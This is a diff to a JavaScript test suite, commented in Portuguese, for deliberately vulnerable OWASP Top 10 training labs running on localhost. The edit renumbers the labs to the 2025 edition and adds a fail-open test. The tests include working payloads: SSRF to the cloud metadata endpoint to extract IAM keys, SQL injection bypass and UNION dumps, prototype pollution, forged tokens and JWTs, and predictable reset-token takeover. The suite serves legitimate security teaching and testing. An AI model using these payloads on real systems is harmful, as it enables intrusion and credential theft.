@@ -1,16 +1,16 @@
 /**
- * Suite COMPLETA dos laboratorios OWASP A01..A10.
+ * Suite COMPLETA dos laboratorios OWASP A01..A10 (edição 2025).
  * Cobre, para cada lab: (1) exploit POSITIVO valida a flag; (2) casos NEGATIVOS
  * (baseline legitimo, near-miss, falta de auth) NAO vazam a flag / nao sao aceitos.
  *
- * Requer um servidor RECEM-INICIADO (seed limpo), pois o A04 reseta a senha do admin.
+ * Requer um servidor RECEM-INICIADO (seed limpo), pois o A06 reseta a senha do admin.
  * Rode:  node test-all.mjs
  * Sai com codigo != 0 se qualquer assercao falhar.
  */
-const B = 'http://localhost:4000/api';
+const B = `http://localhost:${process.env.API_PORT ?? 4000}/api`;
 import crypto from 'node:crypto';
 // Replica o MESMO hash fraco do backend (server/db.ts) so para o teste calcular
-// o valor esperado e validar o exploit do lab A02 — nao e uso em producao.
+// o valor esperado e validar o exploit do lab A04 — nao e uso em producao.
 const md5 = (s) => crypto.createHash('md5').update(s).digest('hex'); // NOSONAR (javascript:S4790 — script de teste, espelha o alvo proposital do lab)
 const b64url = (s) => Buffer.from(s).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 const d64 = (s) => Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString();
@@ -76,65 +76,65 @@ section('A01 IDOR');
   ok('A01 perfil inexistente → 404', missing.status === 404);
 }
 
-// ════════════════════ A05 — Misconfig (precisa vir antes do A07 p/ vazar JWT_SECRET) ════════════════════
-section('A05 Misconfig');
+// ════════════════════ A02 — Misconfig (precisa vir antes do A07 p/ vazar JWT_SECRET) ════════════════════
+section('A02 Misconfig');
 let JWT_SECRET;
 {
-  const dbg = await get('/a05/debug/env');
+  const dbg = await get('/a02/debug/env');
   JWT_SECRET = dbg.json?.jwtSecret;
-  ok('A05 /debug/env vaza appSecret=flag', await validates('a05-misconfig-debug', flagIn(dbg.text)));
-  ok('A05 dump também vaza JWT_SECRET (p/ A07)', typeof JWT_SECRET === 'string' && JWT_SECRET.length > 0);
-  const baseline = await get('/a05/');
-  ok('A05 baseline (/) NÃO vaza flag', !flagIn(baseline.text));
+  ok('A02 /debug/env vaza appSecret=flag', await validates('a05-misconfig-debug', flagIn(dbg.text)));
+  ok('A02 dump também vaza JWT_SECRET (p/ A07)', typeof JWT_SECRET === 'string' && JWT_SECRET.length > 0);
+  const baseline = await get('/a02/');
+  ok('A02 baseline (/) NÃO vaza flag', !flagIn(baseline.text));
 }
 
-// ════════════════════ A10 — SSRF (precisa vir antes do A08 p/ roubar a chave) ════════════════════
-section('A10 SSRF');
+// ════════════════════ A01-SSRF — SSRF (precisa vir antes do A08 p/ roubar a chave) ════════════════════
+section('A01 SSRF');
 let awsKey;
 {
-  const ext = await get('/a10/fetch-url?url=' + encodeURIComponent('https://status.cybershield.local/health'));
-  ok('A10 baseline (URL externa) NÃO vaza flag', !flagIn(ext.text));
+  const ext = await get('/a01/fetch-url?url=' + encodeURIComponent('https://status.cybershield.local/health'));
+  ok('A01-SSRF baseline (URL externa) NÃO vaza flag', !flagIn(ext.text));
   const base = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
-  const role = (await get('/a10/fetch-url?url=' + encodeURIComponent(base))).text.trim().split('\n')[0];
-  ok('A10 IMDS passo 1 lista a role', /ec2-app-role/.test(role), `role=${role}`);
-  const creds = await get('/a10/fetch-url?url=' + encodeURIComponent(base + role));
+  const role = (await get('/a01/fetch-url?url=' + encodeURIComponent(base))).text.trim().split('\n')[0];
+  ok('A01-SSRF IMDS passo 1 lista a role', /ec2-app-role/.test(role), `role=${role}`);
+  const creds = await get('/a01/fetch-url?url=' + encodeURIComponent(base + role));
   awsKey = flagIn(creds.text);
-  ok('A10 IMDS passo 2 vaza SecretAccessKey=flag', await validates('a10-ssrf', awsKey));
+  ok('A01-SSRF IMDS passo 2 vaza SecretAccessKey=flag', await validates('a10-ssrf', awsKey));
 }
 
-// ════════════════════ A02 — Token reversível ════════════════════
-section('A02 Crypto');
+// ════════════════════ A04 — Token reversível ════════════════════
+section('A04 Crypto');
 {
-  const login = await post('/a02/login', { username: 'suporte_financeiro', password: '123456' });
+  const login = await post('/a04/login', { username: 'suporte_financeiro', password: '123456' });
   const tok = login.json.sessionToken;
-  const normal = await get('/a02/account', { authorization: 'Bearer ' + tok });
-  ok('A02 token original (role user) NÃO vaza', normal.json?.role === 'user' && normal.json?.privilegedApiKey === undefined && !flagIn(normal.text));
+  const normal = await get('/a04/account', { authorization: 'Bearer ' + tok });
+  ok('A04 token original (role user) NÃO vaza', normal.json?.role === 'user' && normal.json?.privilegedApiKey === undefined && !flagIn(normal.text));
   const claims = JSON.parse(d64(tok)); claims.role = 'admin';
-  const forged = await get('/a02/account', { authorization: 'Bearer ' + b64url(JSON.stringify(claims)) });
-  ok('A02 token forjado (role admin) vaza privilegedApiKey=flag', await validates('a02-reversible-token', flagIn(forged.text)));
+  const forged = await get('/a04/account', { authorization: 'Bearer ' + b64url(JSON.stringify(claims)) });
+  ok('A04 token forjado (role admin) vaza privilegedApiKey=flag', await validates('a02-reversible-token', flagIn(forged.text)));
 }
 
-// ════════════════════ A03 — SQLi ════════════════════
-section('A03 SQLi');
+// ════════════════════ A05 — SQLi ════════════════════
+section('A05 SQLi');
 {
-  const normal = await post('/a03/login', { username: 'admin', password: 'senha123' });
-  ok('A03 login normal (senha errada) → sem auth, sem flag', normal.json?.authenticated !== true && !flagIn(normal.text));
-  const bypass = await post('/a03/login', { username: "admin' OR '1'='1' -- ", password: 'x' });
-  ok('A03 bypass booleano autentica como admin', bypass.json?.authenticated === true);
-  const dump = await post('/a03/login', { username: "x' UNION SELECT id, username, password_md5, role, api_key FROM users -- ", password: 'x' });
-  ok('A03 UNION dumpa a tabela (múltiplas linhas)', (dump.json?.rowCount ?? 0) >= 4);
-  ok('A03 dump expõe apiKey do admin = flag', await validates('a03-sqli-login', flagIn(dump.text)));
+  const normal = await post('/a05/login', { username: 'admin', password: 'senha123' });
+  ok('A05 login normal (senha errada) → sem auth, sem flag', normal.json?.authenticated !== true && !flagIn(normal.text));
+  const bypass = await post('/a05/login', { username: "admin' OR '1'='1' -- ", password: 'x' });
+  ok('A05 bypass booleano autentica como admin', bypass.json?.authenticated === true);
+  const dump = await post('/a05/login', { username: "x' UNION SELECT id, username, password_md5, role, api_key FROM users -- ", password: 'x' });
+  ok('A05 UNION dumpa a tabela (múltiplas linhas)', (dump.json?.rowCount ?? 0) >= 4);
+  ok('A05 dump expõe apiKey do admin = flag', await validates('a03-sqli-login', flagIn(dump.text)));
 }
 
-// ════════════════════ A06 — Prototype pollution ════════════════════
-section('A06 Components');
+// ════════════════════ A03 — Prototype pollution ════════════════════
+section('A03 Components');
 {
-  const benign = await post('/a06/merge-config', { theme: 'light' });
-  ok('A06 merge benigno NÃO vaza masterKey', !flagIn(benign.text));
-  const polluted = await post('/a06/merge-config', JSON.parse('{"__proto__":{"isAdmin":true}}'));
-  ok('A06 prototype pollution vaza masterKey=flag', await validates('a06-vuln-components', flagIn(polluted.text)));
-  const after = await post('/a06/merge-config', { theme: 'dark' });
-  ok('A06 poluição revertida (sem vazamento residual)', !flagIn(after.text));
+  const benign = await post('/a03/merge-config', { theme: 'light' });
+  ok('A03 merge benigno NÃO vaza masterKey', !flagIn(benign.text));
+  const polluted = await post('/a03/merge-config', JSON.parse('{"__proto__":{"isAdmin":true}}'));
+  ok('A03 prototype pollution vaza masterKey=flag', await validates('a06-vuln-components', flagIn(polluted.text)));
+  const after = await post('/a03/merge-config', { theme: 'dark' });
+  ok('A03 poluição revertida (sem vazamento residual)', !flagIn(after.text));
 }
 
 // ════════════════════ A07 — JWT (alg=none, assinatura adulterada, segredo vazado) ════════════════════
@@ -154,10 +154,10 @@ section('A07 JWT');
 
   const valid = signHS256({ sub: 'dev_junior', role: 'admin' }, JWT_SECRET);
   const asValid = await get('/a07/admin', { authorization: 'Bearer ' + valid });
-  ok('A07 HS256 VÁLIDO c/ JWT_SECRET vazado no A05 → vaza flag (kill chain)', await validates('a07-jwt-none', flagIn(asValid.text)));
+  ok('A07 HS256 VÁLIDO c/ JWT_SECRET vazado no A02 → vaza flag (kill chain)', await validates('a07-jwt-none', flagIn(asValid.text)));
 }
 
-// ════════════════════ A08 — Desserialização (exige X-Cloud-Key do A10 + IIFE) ════════════════════
+// ════════════════════ A08 — Desserialização (exige X-Cloud-Key do A01-SSRF + IIFE) ════════════════════
 section('A08 Deserialization');
 {
   const benignNoKey = await post('/a08/import-profile', { data: '{"name":"ana","role":"user"}' });
@@ -193,22 +193,35 @@ section('A09 Log injection -> dashboard XSS');
     dashFinal.json?.analystSession?.hijacked === true && await validates('a09-log-injection', flagIn(dashFinal.text)));
 }
 
-// ════════════════════ A04 — Reset previsível (POR ÚLTIMO: reseta a senha do admin) ════════════════════
-section('A04 Insecure Design');
+// ════════════════════ A06 — Reset previsível (POR ÚLTIMO: reseta a senha do admin) ════════════════════
+section('A06 Insecure Design');
 {
-  const noMail = await get('/a04/mailbox/admin');
-  ok('A04 mailbox antes do /forgot → 404, sem token', noMail.status === 404);
+  const noMail = await get('/a06/mailbox/admin');
+  ok('A06 mailbox antes do /forgot → 404, sem token', noMail.status === 404);
 
-  await post('/a04/forgot', { username: 'admin' });
+  await post('/a06/forgot', { username: 'admin' });
 
-  const mail = await get('/a04/mailbox/admin');
-  ok('A04 mailbox após /forgot confirma envio, mas MASCARA o token', mail.status === 200 && /••••/.test(mail.json?.resetLink ?? '') && !/\d{9,}/.test(mail.text));
+  const mail = await get('/a06/mailbox/admin');
+  ok('A06 mailbox após /forgot confirma envio, mas MASCARA o token', mail.status === 200 && /••••/.test(mail.json?.resetLink ?? '') && !/\d{9,}/.test(mail.text));
 
-  const now = (await get('/a04/server-time')).json.epochSeconds;
-  const wrong = await post('/a04/reset', { username: 'admin', token: String(now - 99999), newPassword: 'X#1' });
-  ok('A04 token fora da janela → rejeitado, sem flag', !flagIn(wrong.text));
-  const good = await post('/a04/reset', { username: 'admin', token: String(now), newPassword: 'Pwned#1' });
-  ok('A04 token previsto (epoch) → account takeover, vaza recoveryNote=flag', await validates('a04-insecure-reset', flagIn(good.text)));
+  const now = (await get('/a06/server-time')).json.epochSeconds;
+  const wrong = await post('/a06/reset', { username: 'admin', token: String(now - 99999), newPassword: 'X#1' });
+  ok('A06 token fora da janela → rejeitado, sem flag', !flagIn(wrong.text));
+  const good = await post('/a06/reset', { username: 'admin', token: String(now), newPassword: 'Pwned#1' });
+  ok('A06 token previsto (epoch) → account takeover, vaza recoveryNote=flag', await validates('a04-insecure-reset', flagIn(good.text)));
+}
+
+// ════════════════════ A10 — Exceptional Conditions (fail-open) ════════════════════
+section('A10 Exceptional Conditions');
+{
+  const okTx = await post('/a10/transfers/approve', { transferId: 'TR-1', amount: 500 });
+  ok('A10 transferência pequena → aprovada normalmente, sem flag', okTx.status === 200 && okTx.json?.riskEngine === 'ok' && !flagIn(okTx.text));
+  const big = await post('/a10/transfers/approve', { transferId: 'TR-2', amount: 25000 });
+  ok('A10 transferência acima do limite → 202 revisão manual, sem flag', big.status === 202 && !flagIn(big.text));
+  const bad = await post('/a10/transfers/approve', { transferId: 'TR-3', amount: 'abc' });
+  ok('A10 amount não numérico → fail-open: aprovada + vaza treasuryVoucher=flag', bad.json?.status === 'approved' && await validates('a10-fail-open', flagIn(bad.text)));
+  const neg = await post('/a10/transfers/approve', { transferId: 'TR-4', amount: -1 });
+  ok('A10 amount negativo também cai no fail-open', neg.json?.riskEngine === 'degraded (fail-open)');
 }
 
 // ════════════════════ Resumo ════════════════════
